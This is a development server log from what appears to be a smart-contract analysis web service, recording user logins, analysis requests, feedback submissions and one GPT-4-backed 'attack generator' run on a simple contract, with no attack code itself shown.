2025-06-21 10:53:41,675 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:41] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 10:53:41,703 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:53:41,734 - app.api.feedback - INFO - Feedback saved with ID: 4, status: KO
2025-06-21 10:53:41,738 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:41] "POST /feedback HTTP/1.1" 200 -
2025-06-21 10:53:42,848 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:53:42,887 - app.api.feedback - INFO - Feedback saved with ID: 5, status: KO
2025-06-21 10:53:42,891 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:42] "POST /feedback HTTP/1.1" 200 -
2025-06-21 10:55:10,679 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:55:10] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 10:55:10,712 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:55:10,723 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 10:55:10,738 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 10:55:10,770 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_10-55, status: ERROR
2025-06-21 10:55:10,772 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 10:55:10,776 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:55:10] "POST /analyze HTTP/1.1" 200 -
2025-06-21 10:55:13,067 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:55:13] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 10:55:13,093 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:55:13,114 - app.api.feedback - WARNING - User 1 has already submitted feedback for report 1
2025-06-21 10:55:13,119 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:55:13] "[31m[1mPOST /feedback HTTP/1.1[0m" 400 -
2025-06-21 11:11:54,963 - app.app - INFO - Application started
2025-06-21 11:11:54,976 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.96.5:8000
2025-06-21 11:11:54,979 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 11:12:33,042 - app.app - INFO - Application started
2025-06-21 11:12:33,056 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.144.5:8000
2025-06-21 11:12:33,057 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 11:13:01,169 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:01] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 11:13:01,275 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:01] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 11:13:14,898 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:14] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 11:13:15,355 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:15] "POST /register HTTP/1.1" 200 -
2025-06-21 11:13:19,849 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:19] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 11:13:20,254 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:20] "POST /login HTTP/1.1" 200 -
2025-06-21 11:13:24,198 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:24] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:13:24,221 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:13:24,231 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:13:24,237 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:13:24,278 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-13, status: ERROR
2025-06-21 11:13:24,280 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:13:24,282 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:24] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:13:26,793 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:26] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:13:26,820 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:13:26,866 - app.api.feedback - INFO - Feedback saved with ID: 1, status: OK
2025-06-21 11:13:26,870 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:26] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:13:33,587 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:33] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:13:33,617 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:13:33,628 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:13:33,636 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:13:33,656 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-13, status: ERROR
2025-06-21 11:13:33,658 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:13:33,661 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:33] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:13:36,092 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:36] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:13:36,117 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:13:36,137 - app.api.feedback - WARNING - User 1 has already submitted feedback for report 1
2025-06-21 11:13:36,141 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:13:36] "[31m[1mPOST /feedback HTTP/1.1[0m" 400 -
2025-06-21 11:14:57,659 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:14:57] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:14:57,684 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:14:57,691 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:14:57,705 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:14:57,873 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-21 11:14:58,804 - solcx - INFO - Using solc version 0.8.0
2025-06-21 11:14:58,806 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 11:14:58,811 - solcx - INFO - Using solc version 0.8.0
2025-06-21 11:15:02,717 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 11:15:03,555 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-21 11:15:03,557 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-21 11:15:03,558 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-21 11:15:03,559 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-21 11:15:03,562 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 11:15:03,563 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 11:15:03,564 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 11:15:11,362 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 11:15:11,373 - app.modules.attack_generator - INFO - Received response from OpenAI API in 7.81 seconds
2025-06-21 11:15:11,383 - app.modules.attack_generator - INFO - Contract analysis completed in 7.81 seconds
2025-06-21 11:15:11,386 - app.modules.attack_generator - INFO - Vulnerability assessment: Given the simplicity of the contract, there are no apparent security vulnerabilities. The contract d...
2025-06-21 11:15:11,388 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-21 11:15:11,390 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 11:15:11,393 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 11:15:11,395 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 11:15:18,601 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 11:15:18,621 - app.modules.attack_generator - INFO - Received response from OpenAI API in 7.23 seconds
2025-06-21 11:15:18,629 - app.modules.attack_generator - INFO - Attack code generation completed in 7.23 seconds
2025-06-21 11:15:18,634 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 533
2025-06-21 11:15:18,638 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 15.04 seconds
2025-06-21 11:15:18,640 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-21 11:15:18,666 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-21_11-15, status: KO
2025-06-21 11:15:18,669 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:15:18,673 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:15:18] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:15:21,579 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:15:21] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:15:21,609 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:15:21,631 - app.api.feedback - WARNING - User 1 has already submitted feedback for report 1
2025-06-21 11:15:21,636 - werkzeug - INFO - 192.168.144.1 - - [21/Jun/2025 11:15:21] "[31m[1mPOST /feedback HTTP/1.1[0m" 400 -
2025-06-21 11:21:55,197 - app.app - INFO - Application started
2025-06-21 11:21:55,210 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.160.5:8000
2025-06-21 11:21:55,212 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 11:22:19,497 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:19] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:22:19,625 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:19] "GET /history HTTP/1.1" 200 -
2025-06-21 11:22:23,527 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:23] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 11:22:23,976 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:23] "POST /login HTTP/1.1" 200 -
2025-06-21 11:22:29,292 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:29] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:22:29,323 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:22:29,336 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:22:29,344 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:22:29,385 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-22, status: ERROR
2025-06-21 11:22:29,387 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:22:29,390 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:29] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:22:29,405 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:29] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:22:29,429 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:29] "GET /history HTTP/1.1" 200 -
2025-06-21 11:22:31,313 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:31] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:22:31,341 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:22:31,388 - app.api.feedback - INFO - Feedback saved with ID: 2, status: OK
2025-06-21 11:22:31,393 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:31] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:22:39,020 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:39] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:22:39,049 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:22:39,062 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:22:39,071 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:22:39,091 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-22, status: ERROR
2025-06-21 11:22:39,092 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:22:39,095 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:39] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:22:39,112 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:39] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:22:39,133 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:39] "GET /history HTTP/1.1" 200 -
2025-06-21 11:22:40,759 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:40] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:22:40,786 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:22:40,816 - app.api.feedback - INFO - Feedback saved with ID: 3, status: OK
2025-06-21 11:22:40,820 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:40] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:22:47,334 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:47] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:22:47,363 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:22:47,376 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:22:47,384 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:22:47,404 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-22, status: ERROR
2025-06-21 11:22:47,407 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:22:47,410 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:47] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:22:47,425 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:47] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:22:47,447 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:47] "GET /history HTTP/1.1" 200 -
2025-06-21 11:22:50,101 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:50] "GET /history HTTP/1.1" 200 -
2025-06-21 11:22:52,020 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:52] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:22:52,046 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:22:52,077 - app.api.feedback - INFO - Feedback saved with ID: 4, status: KO
2025-06-21 11:22:52,080 - werkzeug - INFO - 192.168.160.1 - - [21/Jun/2025 11:22:52] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:36:05,824 - app.app - INFO - Application started
2025-06-21 11:36:05,836 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.208.5:8000
2025-06-21 11:36:05,838 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 11:36:12,896 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:12] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:36:13,183 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:13] "GET /history HTTP/1.1" 200 -
2025-06-21 11:36:17,416 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:17] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:36:17,446 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:36:17,458 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:36:17,469 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:36:17,522 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-36, status: ERROR
2025-06-21 11:36:17,524 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:36:17,527 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:17] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:36:17,555 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:17] "GET /history HTTP/1.1" 200 -
2025-06-21 11:36:19,788 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:19] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:36:19,816 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:36:19,868 - app.api.feedback - INFO - Feedback saved with ID: 5, status: OK
2025-06-21 11:36:19,871 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:19] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:36:22,827 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:22] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:36:22,856 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:36:22,869 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:36:22,878 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:36:22,899 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-36, status: ERROR
2025-06-21 11:36:22,901 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:36:22,903 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:22] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:36:22,918 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:22] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:36:22,940 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:22] "GET /history HTTP/1.1" 200 -
2025-06-21 11:36:24,974 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:24] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:36:25,006 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:36:25,033 - app.api.feedback - INFO - Feedback saved with ID: 6, status: KO
2025-06-21 11:36:25,037 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:25] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:36:26,625 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:26] "GET /history HTTP/1.1" 200 -
2025-06-21 11:36:33,655 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:33] "OPTIONS /report/0xAb5801a7D398351b8bE11C439e05C5B3259aec44/Unknown_2025-06-21_11-22 HTTP/1.1" 200 -
2025-06-21 11:36:33,698 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:36:33] "GET /report/0xAb5801a7D398351b8bE11C439e05C5B3259aec44/Unknown_2025-06-21_11-22 HTTP/1.1" 200 -
2025-06-21 11:55:22,986 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:22] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:55:23,040 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:23] "GET /history HTTP/1.1" 200 -
2025-06-21 11:55:25,630 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:25] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 11:55:26,115 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:26] "POST /login HTTP/1.1" 200 -
2025-06-21 11:55:28,986 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:28] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:55:29,018 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:55:29,029 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:55:29,037 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:55:29,062 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-55, status: ERROR
2025-06-21 11:55:29,064 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:55:29,066 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:29] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:55:29,083 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:29] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:55:29,106 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:29] "GET /history HTTP/1.1" 200 -
2025-06-21 11:55:31,202 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:31] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:55:31,229 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:55:31,259 - app.api.feedback - INFO - Feedback saved with ID: 7, status: KO
2025-06-21 11:55:31,263 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:31] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:55:33,868 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:55:33,883 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:55:33,896 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:55:33,922 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-55, status: ERROR
2025-06-21 11:55:33,926 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:55:33,929 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:33] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:55:33,958 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:33] "GET /history HTTP/1.1" 200 -
2025-06-21 11:55:35,649 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:55:35,692 - app.api.feedback - INFO - Feedback saved with ID: 8, status: OK
2025-06-21 11:55:35,697 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 11:55:35] "POST /feedback HTTP/1.1" 200 -
2025-06-21 11:57:58,031 - app.app - INFO - Application started
2025-06-21 11:57:58,044 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.240.5:8000
2025-06-21 11:57:58,047 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 11:58:49,196 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:58:49] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:58:49,287 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:58:49] "[33mGET /history HTTP/1.1[0m" 404 -
2025-06-21 11:58:54,437 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:58:54] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 11:58:54,469 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:58:54] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 11:59:13,040 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:13] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 11:59:13,487 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:13] "POST /register HTTP/1.1" 200 -
2025-06-21 11:59:23,229 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:23] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 11:59:23,652 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:23] "POST /login HTTP/1.1" 200 -
2025-06-21 11:59:26,590 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:26] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 11:59:26,621 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:59:26,637 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 11:59:26,646 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 11:59:26,686 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_11-59, status: ERROR
2025-06-21 11:59:26,688 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 11:59:26,692 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:26] "POST /analyze HTTP/1.1" 200 -
2025-06-21 11:59:26,705 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:26] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 11:59:26,745 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:26] "GET /history HTTP/1.1" 200 -
2025-06-21 11:59:29,274 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:29] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 11:59:29,300 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 11:59:29,349 - app.api.feedback - INFO - Feedback saved with ID: 1, status: OK, user_score: 1
2025-06-21 11:59:29,352 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 11:59:29] "POST /feedback HTTP/1.1" 200 -
2025-06-21 12:01:01,580 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 12:01:01] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 12:01:01,612 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:01:01,623 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 12:01:01,638 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 12:01:01,662 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_12-01, status: ERROR
2025-06-21 12:01:01,664 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 12:01:01,667 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 12:01:01] "POST /analyze HTTP/1.1" 200 -
2025-06-21 12:01:01,693 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 12:01:01] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 12:01:01,720 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 12:01:01] "GET /history HTTP/1.1" 200 -
2025-06-21 12:01:03,707 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 12:01:03] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 12:01:03,731 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:01:03,757 - app.api.feedback - INFO - Feedback saved with ID: 2, status: KO, user_score: 1
2025-06-21 12:01:03,760 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 12:01:03] "POST /feedback HTTP/1.1" 200 -
2025-06-21 12:01:06,395 - werkzeug - INFO - 192.168.240.1 - - [21/Jun/2025 12:01:06] "GET /history HTTP/1.1" 200 -
2025-06-21 12:07:22,695 - app.app - INFO - Application started
2025-06-21 12:07:22,710 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.19.0.5:8000
